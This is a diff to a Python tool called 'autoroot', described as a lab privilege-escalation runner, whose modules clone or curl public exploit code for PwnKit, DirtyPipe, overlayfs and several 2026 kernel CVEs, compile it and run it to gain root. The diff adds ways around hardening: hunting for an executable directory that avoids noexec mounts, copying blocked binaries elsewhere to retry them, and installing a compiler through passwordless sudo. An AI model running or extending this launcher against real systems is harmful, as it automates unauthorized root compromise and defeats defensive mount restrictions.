@@ -1,4 +1,4 @@
-#!/usr/bin/env python3
+﻿#!/usr/bin/env python3
 """
 autoroot - lab privilege-escalation runner.
 
@@ -68,9 +68,118 @@ def log(text: str) -> None:
 # environment
 # ---------------------------------------------------------------------------
 
-WORK = tempfile.mkdtemp(prefix="autoroot.")
+WORK = ""
+CC = "gcc"
+_COMPILER_CHECKED = False
 TIMEOUT = int(os.environ.get("AUTOROOT_TIMEOUT", "45"))
 DRY = False
+
+
+def mount_options(path: str) -> str:
+    best = None
+    try:
+        with open("/proc/mounts", encoding="utf-8", errors="replace") as fh:
+            for line in fh:
+                parts = line.split()
+                if len(parts) >= 4 and path.startswith(parts[1]):
+                    if best is None or len(parts[1]) > len(best[0]):
+                        best = (parts[1], parts[3])
+    except OSError:
+        pass
+    return best[1] if best else ""
+
+
+def find_workdir() -> str:
+    candidates = []
+    if os.environ.get("AUTOROOT_WORK"):
+        candidates.append(os.environ["AUTOROOT_WORK"])
+    home = os.path.expanduser("~")
+    candidates += [
+        os.path.join(home, ".cache", "autoroot"),
+        "/dev/shm/autoroot",
+        "/var/tmp/autoroot",
+        "/tmp/autoroot",
+    ]
+    for base in candidates:
+        try:
+            os.makedirs(base, mode=0o700, exist_ok=True)
+            if not os.access(base, os.W_OK | os.X_OK):
+                continue
+            opts = mount_options(base)
+            if "noexec" in opts:
+                continue
+            path = tempfile.mkdtemp(prefix="run.", dir=base)
+            os.chmod(path, 0o700)
+            return path
+        except OSError:
+            continue
+    # Last resort: a writable dir even if noexec (scripts can still run).
+    return tempfile.mkdtemp(prefix="autoroot.")
+
+
+def install_packages() -> bool:
+    """Try to install a compiler/tools using passwordless sudo only."""
+    if not shutil.which("sudo"):
+        return False
+    plans = []
+    if shutil.which("apt-get"):
+        plans.append(["sudo", "-n", "apt-get", "update"])
+        plans.append(["sudo", "-n", "apt-get", "install", "-y",
+                      "gcc", "build-essential", "git", "curl", "tar", "make"])
+    elif shutil.which("dnf"):
+        plans.append(["sudo", "-n", "dnf", "install", "-y",
+                      "gcc", "make", "git", "curl", "tar"])
+    elif shutil.which("yum"):
+        plans.append(["sudo", "-n", "yum", "install", "-y",
+                      "gcc", "make", "git", "curl", "tar"])
+    elif shutil.which("apk"):
+        plans.append(["sudo", "-n", "apk", "add", "--no-cache",
+                      "gcc", "musl-dev", "make", "git", "curl", "tar"])
+    elif shutil.which("pacman"):
+        plans.append(["sudo", "-n", "pacman", "-Sy", "--noconfirm",
+                      "gcc", "make", "git", "curl", "tar"])
+    elif shutil.which("zypper"):
+        plans.append(["sudo", "-n", "zypper", "install", "-y",
+                      "gcc", "make", "git", "curl", "tar"])
+
+    for cmd in plans:
+        try:
+            rc = subprocess.run(cmd, timeout=180).returncode
+            if rc == 0 and (shutil.which("gcc") or shutil.which("cc")
+                            or shutil.which("clang")):
+                return True
+        except (OSError, subprocess.TimeoutExpired):
+            continue
+    return False
+
+
+def ensure_compiler() -> bool:
+    global CC, _COMPILER_CHECKED
+    if _COMPILER_CHECKED:
+        return bool(shutil.which(CC))
+    _COMPILER_CHECKED = True
+    for candidate in ("gcc", "cc", "clang", "tcc"):
+        if shutil.which(candidate):
+            CC = candidate
+            log(ok(f"  compiler: {CC}"))
+            return True
+    log(warn("  no C compiler; trying package manager (sudo -n)"))
+    if install_packages():
+        for candidate in ("gcc", "cc", "clang", "tcc"):
+            if shutil.which(candidate):
+                CC = candidate
+                log(ok(f"  compiler installed: {CC}"))
+                return True
+    log(bad("  compiler unavailable; compile-based modules will skip"))
+    return False
+
+
+def ensure_tools() -> None:
+    missing = [t for t in ("git", "curl", "tar", "make") if not shutil.which(t)]
+    if missing:
+        log(warn(f"  missing tools: {', '.join(missing)}; trying install"))
+        install_packages()
+
 
 
 def sh(cmd: str, desc: str = "", cwd: str | None = None,
@@ -80,18 +189,43 @@ def sh(cmd: str, desc: str = "", cwd: str | None = None,
     log(f"      $ {cmd}")
     if DRY:
         return 0
-    try:
-        return subprocess.run(
-            ["bash", "-c", cmd],
-            cwd=cwd or WORK,
-            timeout=timeout if timeout is not None else TIMEOUT,
-        ).returncode
-    except subprocess.TimeoutExpired:
-        log(bad(f"      timeout after {timeout or TIMEOUT}s"))
-        return 124
-    except FileNotFoundError as exc:
-        log(bad(f"      {exc}"))
-        return 127
+
+    def _run(command: str) -> int:
+        try:
+            return subprocess.run(
+                ["bash", "-c", command],
+                cwd=cwd or WORK,
+                timeout=timeout if timeout is not None else TIMEOUT,
+            ).returncode
+        except subprocess.TimeoutExpired:
+            log(bad(f"      timeout after {timeout or TIMEOUT}s"))
+            return 124
+        except FileNotFoundError as exc:
+            log(bad(f"      {exc}"))
+            return 127
+
+    rc = _run(cmd)
+    if rc == 126 and cmd.lstrip().startswith("./"):
+        token = cmd.split()[0]
+        src = os.path.join(cwd or WORK, token)
+        if os.path.exists(src):
+            for base in (os.path.expanduser("~/.cache/autoroot-exec"),
+                         "/dev/shm/autoroot-exec"):
+                try:
+                    os.makedirs(base, mode=0o700, exist_ok=True)
+                    if "noexec" in mount_options(base):
+                        continue
+                    dst = os.path.join(base, os.path.basename(src))
+                    shutil.copy2(src, dst)
+                    os.chmod(dst, 0o755)
+                    retry = cmd.replace(token, dst, 1)
+                    log(warn(f"      noexec/permission retry: {retry}"))
+                    rc = _run(retry)
+                    if rc != 126:
+                        break
+                except OSError:
+                    continue
+    return rc
 
 
 def have(cmd: str) -> bool:
@@ -191,11 +325,11 @@ def m_pwnkit():
     if not pk or not has_suid(pk):
         log(warn("      pkexec yok veya SUID degil"))
         return False
-    if not have("gcc"):
+    if not ensure_compiler():
         log(warn("      gcc yok"))
         return False
     sh("curl -fsSL https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/refs/heads/main/cve-2021-4034-poc.c -o pwn.c", "download")
-    sh("gcc pwn.c -o pwn", "compile")
+    sh(f"{CC} pwn.c -o pwn", "compile")
     sh("./pwn", "run")
     return True
 
@@ -205,11 +339,11 @@ def m_dirtypipe():
     if not in_kernel_range((5, 8), (5, 16)):
         log(warn(f"      kernel {platform.release()} aralikta degil"))
         return False
-    if not have("git") or not have("gcc"):
+    if not have("git") or not ensure_compiler():
         log(warn("      git/gcc yok"))
         return False
     sh("git clone --depth 1 https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit.git dirtypipe", "clone")
-    sh("gcc exploit.c -o exploit", "compile", cwd=os.path.join(WORK, "dirtypipe"))
+    sh(f"{CC} exploit.c -o exploit", "compile", cwd=os.path.join(WORK, "dirtypipe"))
     sh("./exploit", "run", cwd=os.path.join(WORK, "dirtypipe"))
     return True
 
@@ -234,11 +368,11 @@ def m_overlayfs():
     if "overlay" not in fs:
         log(warn("      overlayfs yok"))
         return False
-    if not have("git") or not have("gcc"):
+    if not have("git") or not ensure_compiler():
         log(warn("      git/gcc yok"))
         return False
     sh("git clone --depth 1 https://github.com/xkaneiki/CVE-2023-0386.git overlayfs", "clone")
-    sh("gcc -o exp exp.c -lcap", "compile", cwd=os.path.join(WORK, "overlayfs"))
+    sh(f"{CC} -o exp exp.c -lcap", "compile", cwd=os.path.join(WORK, "overlayfs"))
     sh("./exp", "run", cwd=os.path.join(WORK, "overlayfs"))
     return True
 
@@ -248,11 +382,11 @@ def m_dirtyfrag():
     if not in_kernel_range((6, 1), (6, 6)):
         log(warn(f"      kernel {platform.release()} aralikta degil"))
         return False
-    if not have("git") or not have("gcc"):
+    if not have("git") or not ensure_compiler():
         log(warn("      git/gcc yok"))
         return False
     sh("git clone --depth 1 https://github.com/V4bel/dirtyfrag.git dirtyfrag", "clone")
-    sh("gcc -O0 -Wall -o exp exp.c -lutil", "compile", cwd=os.path.join(WORK, "dirtyfrag"))
+    sh(f"{CC} -O0 -Wall -o exp exp.c -lutil", "compile", cwd=os.path.join(WORK, "dirtyfrag"))
     sh("./exp", "run", cwd=os.path.join(WORK, "dirtyfrag"))
     return True
 
@@ -262,12 +396,12 @@ def m_fragnesia():
     if not in_kernel_range((5, 19), (6, 8)):
         log(warn(f"      kernel {platform.release()} aralikta degil"))
         return False
-    if not have("git") or not have("gcc"):
+    if not have("git") or not ensure_compiler():
         log(warn("      git/gcc yok"))
         return False
     sh("git clone --depth 1 https://github.com/v12-security/pocs.git pocs", "clone")
     d = os.path.join(WORK, "pocs", "fragnesia")
-    sh("gcc -o exp fragnesia.c", "compile", cwd=d)
+    sh(f"{CC} -o exp fragnesia.c", "compile", cwd=d)
     sh("./exp", "run", cwd=d)
     return True
 
@@ -343,9 +477,11 @@ def m_68138():
 
 @module("dirtydecrypt", "DirtyDecrypt (CVE-2026-31635)", "repo, unknown")
 def m_dirtydecrypt():
+    if not ensure_compiler():
+        return False
     sh("git clone --depth 1 https://github.com/0xBlackash/DirtyDecrypt.git dirtydecrypt", "clone")
     d = os.path.join(WORK, "dirtydecrypt")
-    sh("gcc -O2 -static -pthread CVE-2026-31635.c -o DirtyDecrypt", "compile", cwd=d)
+    sh(f"{CC} -O2 -static -pthread CVE-2026-31635.c -o DirtyDecrypt", "compile", cwd=d)
     sh("./DirtyDecrypt", "run", cwd=d)
     return True
 
@@ -365,9 +501,11 @@ def m_cybermeowfia():
 
 @module("cve2026_68398", "CVE-2026-68398", "repo, unknown")
 def m_68398():
+    if not ensure_compiler():
+        return False
     sh("git clone --depth 1 https://github.com/aramosf/cve-2026-68398.git cve68398", "clone")
     d = os.path.join(WORK, "cve68398")
-    sh("gcc -O2 exploit.c kaslr_prefetch.c -o exploit -lpthread", "compile", cwd=d)
+    sh(f"{CC} -O2 exploit.c kaslr_prefetch.c -o exploit -lpthread", "compile", cwd=d)
     sh("./exploit", "run", cwd=d)
     return True
 
@@ -378,18 +516,22 @@ def m_pwnkit2():
     if not pk or not has_suid(pk):
         log(warn("      pkexec yok veya SUID degil"))
         return False
+    if not ensure_compiler():
+        return False
     sh("git clone --depth 1 https://github.com/Rvn0xsy/CVE-2021-4034.git pwnkit2", "clone")
     d = os.path.join(WORK, "pwnkit2")
-    sh("gcc cve-2021-4034.c -o exp", "compile", cwd=d)
+    sh(f"{CC} cve-2021-4034.c -o exp", "compile", cwd=d)
     sh("./exp", "run", cwd=d)
     return True
 
 
 @module("cve2026_64600", "CVE-2026-64600", "repo, unknown")
 def m_64600():
+    if not ensure_compiler():
+        return False
     sh("git clone --depth 1 https://github.com/Debajyoti0-0/CVE-2026-64600.git cve64600", "clone")
     d = os.path.join(WORK, "cve64600")
-    sh("gcc -o cve-2026-64600 cve-2026-64600.c -lm -lpthread", "compile", cwd=d)
+    sh(f"{CC} -o cve-2026-64600 cve-2026-64600.c -lm -lpthread", "compile", cwd=d)
     sh("./cve-2026-64600", "run", cwd=d)
     return True
 
@@ -475,7 +617,7 @@ def run_module(mod: Module) -> None:
 
 
 def main(argv=None) -> int:
-    global DRY, TIMEOUT, UNTRUSTED
+    global DRY, TIMEOUT, UNTRUSTED, WORK
     p = argparse.ArgumentParser(
         description="autoroot - lab privilege-escalation runner")
     p.add_argument("--yes", "-y", action="store_true",
@@ -513,6 +655,10 @@ def main(argv=None) -> int:
     DRY = args.dry_run
     TIMEOUT = args.timeout if args.timeout > 0 else 10 ** 9
     UNTRUSTED = args.allow_untrusted
+    WORK = find_workdir()
+    os.chmod(WORK, 0o700)
+    ensure_tools()
+    ensure_compiler()
 
     selected = [m for m in MODULES if not args.only or m.key == args.only]
     if args.only and not selected:
@@ -568,3 +714,5 @@ def main(argv=None) -> int:
 
 if __name__ == "__main__":
     sys.exit(main())
+
+
